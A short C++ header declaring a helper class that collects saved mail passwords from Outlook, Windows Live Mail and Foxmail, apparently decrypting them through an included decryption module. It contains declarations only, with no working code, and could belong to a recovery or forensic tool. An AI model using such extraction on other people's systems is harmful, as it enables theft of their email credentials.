#ifndef SI_PASSWORD_MAILPASSWORD_H
#define SI_PASSWORD_MAILPASSWORD_H
#include "./mail/DoDecrypt.h"

namespace password
{
    class CMailPasswordsHelper
    {
    public:
		void GetAllMailPasswordsInformation(CPRecord* parentRecord);
    private:
        void GetOutlookPasswordsInformation(MailPasswordInformation& mail_information);
        void GetWindowsLiveMailPasswordsInformation(MailPasswordInformation& mail_information);
        void GetFoxmailPasswordsInformation(MailPasswordInformation& mail_information);
        void GetAllOEAccountFiles(const std::wstring& root_dir, std::vector<std::wstring>& oeaccount_files);
        // for foxmail 6.5 and lower versions
        void GetAllAccountFilesOfFoxmail(const std::wstring& root_dir, std::vector<std::wstring>& account_files);
    private:
    };
}
#endif
